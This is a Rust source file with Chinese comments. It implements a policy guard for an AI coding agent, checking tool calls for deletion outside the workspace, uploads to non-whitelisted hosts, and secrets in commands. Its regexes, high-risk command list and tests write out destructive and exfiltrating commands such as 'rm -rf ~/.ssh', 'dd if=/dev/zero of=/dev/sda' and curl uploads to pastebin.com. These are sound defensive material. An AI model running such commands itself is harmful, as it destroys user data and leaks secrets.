//! 监督 agent 的确定性守卫:supervise.toml 策略文件解析。
//!
//! 策略文件 `~/.raincode/supervise.toml` 是监督 agent(boundary guard)的配置来源:
//! - `[deny]` 硬拒绝规则(命令、路径、域名)。
//! - `[allow]` 用户"永久放行"的高危操作实例。
//! - `[nl]` 自然语言边界,原样交给 LLM 监督 agent 作为判据。
//! - `[guard]` 守卫开关:文件缺失时默认全开(保守),文件存在时缺省字段视为关。

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::{Component, Path, PathBuf};
use std::sync::OnceLock;

#[derive(Debug, thiserror::Error)]
pub enum GuardError {
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("toml parse error: {0}")]
    Toml(#[from] toml::de::Error),
    #[error("toml serialize error: {0}")]
    Ser(#[from] toml::ser::Error),
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct DenyRules {
    /// 硬拒绝的命令子串/模式。
    pub commands: Vec<String>,
    /// 硬拒绝的文件/目录路径。
    pub paths: Vec<String>,
    /// 硬拒绝的域名。
    pub domains: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct AllowRules {
    /// 用户"永久放行"的高危操作实例(如具体命令)。
    pub high_risk: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct GuardFlags {
    /// 工作区外删除/覆盖 → 拦。文件缺失时默认开。
    pub destroy_outside_workspace: bool,
    /// 非白名单域名 POST/PUT(上传)→ 拦。文件缺失时默认开。
    pub upload_to_public: bool,
    /// 疑似密钥外发检测。文件缺失时默认开。
    pub secrets: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SuperviseConfig {
    #[serde(default)]
    pub deny: DenyRules,
    #[serde(default)]
    pub allow: AllowRules,
    /// NL 边界,原样交给 LLM 监督 agent 作为判据。
    #[serde(default)]
    pub nl: Vec<String>,
    #[serde(default)]
    pub guard: GuardFlags,
}

/// 读 `home/supervise.toml`;文件不存在 → 默认配置(守卫全开);坏 TOML → Err。
///
/// 文件存在时,serde 的 `#[serde(default)]` 保证缺省 guard 字段为 false
/// (用户没显式开 = 关,交由 Task 2 的 guard_check 判定)。
pub fn load_supervise_config(home: &Path) -> Result<SuperviseConfig, GuardError> {
    let path = home.join("supervise.toml");
    if !path.exists() {
        return Ok(SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                upload_to_public: true,
                secrets: true,
            },
            ..Default::default()
        });
    }
    let text = std::fs::read_to_string(path)?;
    let cfg: SuperviseConfig = toml::from_str(&text)?;
    Ok(cfg)
}

/// 把一个用户"永久放行"的高危操作实例(具体命令或路径)追加到
/// `home/supervise.toml` 的 `allow.high_risk` 并持久化。幂等:已存在则不再追加。
/// 文件缺失时先建(load_supervise_config 的默认守卫全开,原样写回),
/// 坏 TOML 沿用 load_supervise_config 的 Err 语义(不静默覆盖)。
pub fn append_allow_high_risk(home: &Path, instance: &str) -> Result<(), GuardError> {
    let path = home.join("supervise.toml");
    let mut cfg = load_supervise_config(home)?;
    if !cfg.allow.high_risk.iter().any(|a| a == instance) {
        cfg.allow.high_risk.push(instance.to_string());
        let text = toml::to_string(&cfg)?;
        std::fs::write(path, text)?;
    }
    Ok(())
}

/// 确定性守卫的裁决结果。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GuardDecision {
    /// 直接放行。
    Allowed,
    /// 硬拒绝(保留给更严格的前置策略,当前 guard_check 不直接产生)。
    Denied { reason: String },
    /// 高危操作:需用户授权闸确认(三选一:仅本次/本会话/永久)。
    NeedsUserApproval { reason: String },
}

/// 用户主目录:优先 `dirs`(workspace 已声明),回退环境变量。
fn home_dir() -> Option<PathBuf> {
    if let Some(d) = dirs::home_dir() {
        return Some(d);
    }
    std::env::var_os("HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("USERPROFILE").map(PathBuf::from))
}

/// 解析路径到规范形式:展开 `~/`,相对 cwd 绝对化,再词法规范化(`..` 弹出,`.` 跳过)。
fn resolve_path(cwd: &Path, p: &str) -> PathBuf {
    let expanded = if let Some(rest) = p.strip_prefix("~/") {
        home_dir().unwrap_or_else(|| PathBuf::from("~")).join(rest)
    } else {
        PathBuf::from(p)
    };
    let abs = if expanded.is_absolute() { expanded } else { cwd.join(expanded) };
    let mut out = PathBuf::new();
    for comp in abs.components() {
        match comp {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// 判断 token 是否为 Windows 盘符绝对路径(`C:\...` / `C:/...`)。
fn is_windows_drive_abs(s: &str) -> bool {
    let b = s.as_bytes();
    b.len() >= 3
        && b[0].is_ascii_alphabetic()
        && b[1] == b':'
        && (b[2] == b'\\' || b[2] == b'/')
}

static UPLOAD_RE: OnceLock<Regex> = OnceLock::new();

fn upload_re() -> &'static Regex {
    UPLOAD_RE.get_or_init(|| {
        Regex::new(
            r#"-d(?:\s|=|['"])|--data(?:-raw)?(?:\s|=|['"])|-X(?:\s*)(?i:post)|-F(?:\s|=|['"])|-F\S*@|--form(?:\s|=|['"])|-T(?:\s|=|['"])"#,
        )
        .expect("static upload-intent regex")
    })
}

/// 命令里是否有显式上传意图(curl `-X POST` / `-d` / `--data` / `-F` / `-T`)。
/// 容忍无空格短选项形式:`-d'x=1'`、`-XPOST`、`-Ffile=@x`、`-T file URL`(PUT)。
fn command_has_upload_intent(cmd: &str) -> bool {
    upload_re().is_match(cmd)
}

static SECRET_RE: OnceLock<Regex> = OnceLock::new();

fn secret_re() -> &'static Regex {
    SECRET_RE.get_or_init(|| {
        Regex::new(
            r"(?i)sk-[a-z0-9-]{20,}|AKIA[0-9A-Z]{16}|BEGIN PRIVATE KEY|[a-z0-9+/]{40,}={0,2}|[0-9a-f]{40,}",
        )
        .expect("static secret regex")
    })
}

/// 命令/参数里是否有疑似密钥(API key / AWS key / PEM 私钥 / 长 base64·hex 串)。
fn command_has_secret(haystack: &str) -> bool {
    secret_re().is_match(haystack)
}

/// URL 路径里是否有上传语义段(web_fetch 无命令时兜底判定)。
fn url_has_upload_indicator(u: &str) -> bool {
    u.split('/').skip(3).any(|seg| {
        matches!(seg.to_ascii_lowercase().as_str(), "upload" | "submit" | "attach")
    })
}

/// 确定性守卫:工具执行前调用,返回放行/拒绝/需用户授权。
///
/// 判定顺序:
/// 0. allow 高优先:用户永久放行的具体实例直接放行(覆盖 deny)。
/// 1. deny 命令子串匹配 → NeedsUserApproval。
/// 2. `destroy_outside_workspace`:提取目标路径(path 参数或命令里的绝对/`~` 路径),
///    解析规范化后逃逸出 cwd → NeedsUserApproval。
/// 3. `upload_to_public`:任何工具传入带上传意图的 URL(web_fetch 的 GET 语义由
///    `command_has_upload_intent`/`url_has_upload_indicator` 判定;run_shell 的 curl 上传
///    同样经 `command_has_upload_intent` 命中),且 host 不在白名单 → NeedsUserApproval。
///
/// 白名单语义:`deny.domains` 复用为上传允许列表;列表为空 = 无白名单 = 任何上传
/// 都视为非白名单(保守)。
pub fn guard_check(
    cfg: &SuperviseConfig,
    cwd: &Path,
    tool: &str,
    command: Option<&str>,
    path: Option<&str>,
    url: Option<&str>,
) -> GuardDecision {
    // 0) allow 高优先:用户永久放行的具体实例(命令或路径)直接放行,覆盖 deny。
    if let Some(instance) = command.or(path) {
        if cfg.allow.high_risk.iter().any(|a| instance == a) {
            return GuardDecision::Allowed;
        }
    }
    // 1) 命令 deny 列表(子串匹配)。
    if let Some(cmd) = command {
        for pat in &cfg.deny.commands {
            if cmd.contains(pat) {
                return GuardDecision::NeedsUserApproval {
                    reason: format!("command matches deny pattern '{pat}'"),
                };
            }
        }
    }
    // 2) 工作区外销毁/覆盖。
    if cfg.guard.destroy_outside_workspace {
        let target = path
            .map(|p| resolve_path(cwd, p))
            .or_else(|| {
                command.and_then(|c| {
                    // 从命令里粗提取绝对路径/`~`/Windows 盘符路径(rm/覆盖场景)。
                    c.split_whitespace()
                        .find(|w| {
                            w.starts_with('/') || w.starts_with("~/") || is_windows_drive_abs(w)
                        })
                        .map(|w| resolve_path(cwd, w))
                })
            });
        if let Some(target) = target {
            let cwd_norm = resolve_path(cwd, ".");
            if !target.starts_with(&cwd_norm) {
                return GuardDecision::NeedsUserApproval {
                    reason: format!("operation targets outside workspace: {}", target.display()),
                };
            }
        }
    }
    // 3) 非白名单域名上传。任一工具只要传入带上传意图的 URL 即触发检测:
    //    - web_fetch 的 GET 语义由 `url_has_upload_indicator` 兜底(路径含 upload/submit 等);
    //    - run_shell 的 curl 上传由 `command_has_upload_intent` 命中(curl -d/-F/-X POST 等)。
    //    (Task 2 缺口:原先仅 tool == "web_fetch",curl 经 run_shell 逃逸守卫;此处放宽到 url 判据。)
    if cfg.guard.upload_to_public {
        if let Some(u) = url {
            if u.starts_with("https://") || u.starts_with("http://") {
                let host = u.split('/').nth(2).unwrap_or("");
                let whitelisted = !cfg.deny.domains.is_empty()
                    && cfg
                        .deny
                        .domains
                        .iter()
                        .any(|d| host == d || host.ends_with(&format!(".{d}")));
                let upload_intent = command.is_some_and(command_has_upload_intent)
                    || url_has_upload_indicator(u);
                if upload_intent && !whitelisted {
                    return GuardDecision::NeedsUserApproval {
                        reason: format!("{tool} upload to non-whitelisted host '{host}'"),
                    };
                }
            }
        }
    }
    // 4) 疑似密钥外发:命令/参数里出现密钥形态(API key / AWS key / PEM / 长 hex·base64)→ 需用户授权。
    if cfg.guard.secrets {
        let haystack = [
            command.unwrap_or(""),
            url.unwrap_or(""),
            path.unwrap_or(""),
        ]
        .join(" ");
        if command_has_secret(&haystack) {
            return GuardDecision::NeedsUserApproval {
                reason: "command contains a likely secret (API key / private key)".into(),
            };
        }
    }
    GuardDecision::Allowed
}

/// 轻量命令风险分类:供 Manual 风险模式用——只拦高危命令,放行安全命令,
/// 否则 Manual 会把所有 run_shell 拒掉,agent 无法正常干活。
/// 这里只判"明显高危"的模式;精确路径/策略判定仍由 `guard_check` 在工具内做。
pub fn command_is_high_risk(command: &str) -> bool {
    let c = command.trim().to_lowercase();
    let words: Vec<&str> = c.split_whitespace().collect();
    if words.is_empty() {
        return false;
    }
    let cmd = words[0];
    // 系统级破坏/关机类。
    if matches!(cmd, "shutdown" | "reboot" | "poweroff" | "halt" | "mkfs" | "format" | "dd" | "fdisk" | "rmdir" | "killall") {
        return true;
    }
    // 递归/强制删除(rm -rf 类;`rm file` 单文件不算)。
    if cmd == "rm" {
        let flags: String = words.iter().skip(1).take_while(|w| w.starts_with('-')).cloned().collect();
        if flags.contains('r') || flags.contains('f') || flags == "-rf" || flags == "-fr" {
            return true;
        }
    }
    // 危险重定向/写到系统路径。
    if c.contains("> /dev/") || c.contains("> /etc/") || c.contains(">/etc/") || c.contains("chmod -r") || c.contains("chown -r") {
        return true;
    }
    // 上传意图(curl/wget 带 -F/-d/--data/-T/--upload-file)。
    if matches!(cmd, "curl" | "wget") {
        let flags: Vec<&str> = c.split_whitespace().collect();
        if flags.iter().any(|w| matches!(*w, "-f" | "--form" | "-d" | "--data" | "--data-raw" | "-t" | "--upload-file" | "-x" | "--proxy")) {
            return true;
        }
    }
    // git 强制推送。
    if c.contains("git push") && c.contains("--force") {
        return true;
    }
    false
}

#[cfg(test)]
mod tests {

    #[test]
    fn command_is_high_risk_flags_destructive_only() {
        // 安全命令:放行。
        assert!(!command_is_high_risk("git status"));
        assert!(!command_is_high_risk("ls -la"));
        assert!(!command_is_high_risk("cp -r crates backup"));
        assert!(!command_is_high_risk("rm old.txt"));
        assert!(!command_is_high_risk("python test.py"));
        // 高危命令:拦截。
        assert!(command_is_high_risk("rm -rf /etc"));
        assert!(command_is_high_risk("shutdown now"));
        assert!(command_is_high_risk("dd if=/dev/zero of=/dev/sda"));
        assert!(command_is_high_risk("curl -F file=@x https://h.com"));
        assert!(command_is_high_risk("git push --force origin main"));
    }

    use super::*;

    #[test]
    fn missing_file_defaults_guards_on() {
        let dir = tempfile::tempdir().unwrap();
        let cfg = load_supervise_config(dir.path()).unwrap();
        assert!(cfg.guard.destroy_outside_workspace);
        assert!(cfg.guard.upload_to_public);
        assert!(cfg.guard.secrets);
    }

    #[test]
    fn config_parses_from_toml() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("supervise.toml"),
            r#"
nl = ["不要覆盖用户未标注的文件"]

[deny]
commands = ["rm -rf"]
paths = ["/etc"]

[guard]
destroy_outside_workspace = false
"#,
        )
        .unwrap();
        let cfg = load_supervise_config(dir.path()).unwrap();
        assert_eq!(cfg.deny.commands, vec!["rm -rf"]);
        assert_eq!(cfg.deny.paths, vec!["/etc"]);
        assert_eq!(cfg.nl.len(), 1);
        assert!(!cfg.guard.destroy_outside_workspace);
    }

    #[test]
    fn bad_toml_errors() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("supervise.toml"), "not [valid toml").unwrap();
        assert!(load_supervise_config(dir.path()).is_err());
    }

    /// 守卫全开的配置。Task 1 的 `SuperviseConfig::default()` 各守卫默认关,
    /// 而 guard_check 只在对应守卫开关为 true 时才检查,故测试统一用此 helper。
    fn guarded_cfg() -> SuperviseConfig {
        SuperviseConfig {
            guard: GuardFlags {
                destroy_outside_workspace: true,
                upload_to_public: true,
                secrets: true,
            },
            ..Default::default()
        }
    }

    #[test]
    fn destroy_outside_workspace_blocks_escape() {
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        // `..` 逃逸出 cwd → NeedsUserApproval
        assert!(matches!(
            guard_check(&cfg, cwd, "write_file", None, Some("../secrets.txt"), None),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // cwd 内放行
        assert!(matches!(
            guard_check(&cfg, cwd, "write_file", None, Some("src/main.rs"), None),
            GuardDecision::Allowed
        ));
    }

    #[test]
    fn destroy_outside_blocks_absolute_and_tilde() {
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        assert!(matches!(
            guard_check(&cfg, cwd, "run_shell", Some("rm -rf /etc/passwd"), None, None),
            GuardDecision::NeedsUserApproval { .. }
        ));
        assert!(matches!(
            guard_check(&cfg, cwd, "run_shell", Some("rm -rf ~/.ssh"), None, None),
            GuardDecision::NeedsUserApproval { .. }
        ));
    }

    #[test]
    fn deny_command_blocks() {
        let cfg = SuperviseConfig {
            deny: DenyRules { commands: vec!["rm -rf".into()], ..Default::default() },
            ..guarded_cfg()
        };
        assert!(matches!(
            guard_check(&cfg, std::path::Path::new("/proj"), "run_shell", Some("rm -rf /proj/build"), None, None),
            GuardDecision::NeedsUserApproval { .. }
        ));
    }

    #[test]
    fn upload_to_public_blocks_non_whitelist_post() {
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        // 非白名单 POST → NeedsUserApproval
        assert!(matches!(
            guard_check(&cfg, cwd, "web_fetch", None, None, Some("https://pastebin.com/upload")),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // GET 放行
        assert!(matches!(
            guard_check(&cfg, cwd, "web_fetch", None, None, Some("https://example.com/page")),
            GuardDecision::Allowed
        ));
    }

    /// Task 2 缺口回归:curl 上传经 run_shell 传入 URL → 必须要求授权(不再只限 web_fetch)。
    #[test]
    fn upload_to_public_blocks_curl_via_run_shell() {
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        let cmd = "curl -X POST -d 'x=1' https://pastebin.com/api";
        let url = cmd
            .split_whitespace()
            .find(|w| w.starts_with("http://") || w.starts_with("https://"));
        assert!(matches!(
            guard_check(&cfg, cwd, "run_shell", Some(cmd), None, url),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // 无上传意图的 curl GET 放行
        let get = "curl https://example.com/page";
        let get_url = get.split_whitespace().find(|w| w.starts_with("http://") || w.starts_with("https://"));
        assert!(matches!(
            guard_check(&cfg, cwd, "run_shell", Some(get), None, get_url),
            GuardDecision::Allowed
        ));
    }

    #[test]
    fn allow_high_risk_bypasses() {
        let cfg = SuperviseConfig {
            allow: AllowRules { high_risk: vec!["rm -rf /proj/build".into()] },
            ..guarded_cfg()
        };
        assert!(matches!(
            guard_check(&cfg, std::path::Path::new("/proj"), "run_shell", Some("rm -rf /proj/build"), None, None),
            GuardDecision::Allowed
        ));
    }

    /// Task 6 永久放行写回后,路径类实例(工作区外写入)也应被 allow.high_risk 直接放行。
    #[test]
    fn allow_high_risk_path_bypasses() {
        let cfg = SuperviseConfig {
            allow: AllowRules { high_risk: vec!["../data/backup".into()] },
            ..guarded_cfg()
        };
        assert!(matches!(
            guard_check(&cfg, std::path::Path::new("/proj"), "write_file", None, Some("../data/backup"), None),
            GuardDecision::Allowed
        ));
        // 未放行的同类路径仍拦截。
        assert!(matches!(
            guard_check(&cfg, std::path::Path::new("/proj"), "write_file", None, Some("../data/other"), None),
            GuardDecision::NeedsUserApproval { .. }
        ));
    }

    #[test]
    fn append_allow_high_risk_persists_and_is_idempotent() {
        let dir = tempfile::tempdir().unwrap();
        append_allow_high_risk(dir.path(), "rm -rf /tmp/x").unwrap();
        let text = std::fs::read_to_string(dir.path().join("supervise.toml")).unwrap();
        assert!(text.contains("high_risk"));
        assert!(text.contains("rm -rf /tmp/x"));
        // 幂等:重复追加不产生重复项。
        append_allow_high_risk(dir.path(), "rm -rf /tmp/x").unwrap();
        let cfg = load_supervise_config(dir.path()).unwrap();
        assert_eq!(
            cfg.allow.high_risk.iter().filter(|a| *a == "rm -rf /tmp/x").count(),
            1
        );
    }

    #[test]
    fn append_allow_high_risk_preserves_existing_rules() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("supervise.toml"),
            r#"
[deny]
commands = ["rm -rf /etc"]

[guard]
destroy_outside_workspace = false
"#,
        )
        .unwrap();
        append_allow_high_risk(dir.path(), "rm -rf /tmp/x").unwrap();
        let cfg = load_supervise_config(dir.path()).unwrap();
        assert_eq!(cfg.deny.commands, vec!["rm -rf /etc"]);
        assert_eq!(cfg.allow.high_risk, vec!["rm -rf /tmp/x"]);
        assert!(!cfg.guard.destroy_outside_workspace, "existing guard flags must be preserved");
    }

    /// F2 回归:Windows 盘符绝对路径(`C:\...`)也要从命令里提取出来参与工作区判定。
    #[test]
    fn windows_drive_abs_detector() {
        assert!(is_windows_drive_abs("C:\\Windows\\system32"));
        assert!(is_windows_drive_abs("D:/data"));
        assert!(!is_windows_drive_abs("C:relative"));
        assert!(!is_windows_drive_abs("rm"));
        assert!(!is_windows_drive_abs("https://example.com"));
    }

    #[cfg(windows)]
    #[test]
    fn destroy_outside_blocks_windows_drive_abs() {
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("C:\\proj");
        assert!(matches!(
            guard_check(&cfg, cwd, "run_shell", Some("del C:\\Windows\\system32\\evil.dll"), None, None),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // cwd 内放行。
        assert!(matches!(
            guard_check(&cfg, cwd, "run_shell", Some("del C:\\proj\\build\\tmp.txt"), None, None),
            GuardDecision::Allowed
        ));
    }

    /// F3 回归:curl 上传意图要容忍无空格短选项(`-d'x=1'`、`-XPOST`、`-Ffile=@x`、`-T file`)。
    #[test]
    fn upload_intent_detects_no_space_forms() {
        assert!(command_has_upload_intent("curl -d'x=1' https://a.example.com/api"));
        assert!(command_has_upload_intent("curl -XPOST https://a.example.com/api"));
        assert!(command_has_upload_intent("curl -Ffile=@x https://a.example.com/upload"));
        assert!(command_has_upload_intent("curl -T file https://a.example.com/upload"));
        assert!(command_has_upload_intent("curl --data 'x=1' https://a.example.com/api"));
        assert!(command_has_upload_intent("curl --form file=@x https://a.example.com/upload"));
        // 非上传命令不误报。
        assert!(!command_has_upload_intent("curl https://a.example.com/page"));
        assert!(!command_has_upload_intent("echo -delete"));
        assert!(!command_has_upload_intent("git checkout main"));
    }

    #[test]
    fn upload_to_public_blocks_no_space_curl_forms() {
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        let cases = [
            "curl -d'x=1' https://pastebin.com/api",
            "curl -XPOST https://pastebin.com/api",
            "curl -Ffile=@x https://pastebin.com/upload",
            "curl -T file https://pastebin.com/upload",
        ];
        for cmd in cases {
            let url = cmd
                .split_whitespace()
                .find(|w| w.starts_with("http://") || w.starts_with("https://"));
            assert!(
                matches!(
                    guard_check(&cfg, cwd, "run_shell", Some(cmd), None, url),
                    GuardDecision::NeedsUserApproval { .. }
                ),
                "expected block for {cmd}"
            );
        }
    }

    /// F4 回归:secrets 守卫对常见密钥形态(API key / AWS key / PEM / 长 hex)拦截。
    #[test]
    fn secrets_scan_flags_secret_shapes() {
        let cfg = guarded_cfg();
        let cwd = std::path::Path::new("/proj");
        // sk- 前缀 API key(OpenAI / Anthropic 形态)。
        assert!(matches!(
            guard_check(
                &cfg,
                cwd,
                "run_shell",
                Some("curl -H 'Authorization: Bearer sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456' https://api.example.com"),
                None,
                None
            ),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // AWS access key。
        assert!(matches!(
            guard_check(
                &cfg,
                cwd,
                "run_shell",
                Some("aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE"),
                None,
                None
            ),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // PEM 私钥块。
        assert!(matches!(
            guard_check(
                &cfg,
                cwd,
                "run_shell",
                Some("echo '-----BEGIN PRIVATE KEY-----'"),
                None,
                None
            ),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // 长 hex 串(64 字符,256-bit 密钥)。
        assert!(matches!(
            guard_check(
                &cfg,
                cwd,
                "run_shell",
                Some("echo 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"),
                None,
                None
            ),
            GuardDecision::NeedsUserApproval { .. }
        ));
        // 普通命令放行。
        assert!(matches!(
            guard_check(&cfg, cwd, "run_shell", Some("echo hello"), None, None),
            GuardDecision::Allowed
        ));
    }

    /// F4 回归:secrets 守卫可被配置关掉。
    #[test]
    fn secrets_scan_respects_flag() {
        let cfg = SuperviseConfig {
            guard: GuardFlags { secrets: false, ..Default::default() },
            ..Default::default()
        };
        assert!(matches!(
            guard_check(
                &cfg,
                std::path::Path::new("/proj"),
                "run_shell",
                Some("echo sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456"),
                None,
                None
            ),
            GuardDecision::Allowed
        ));
    }
}
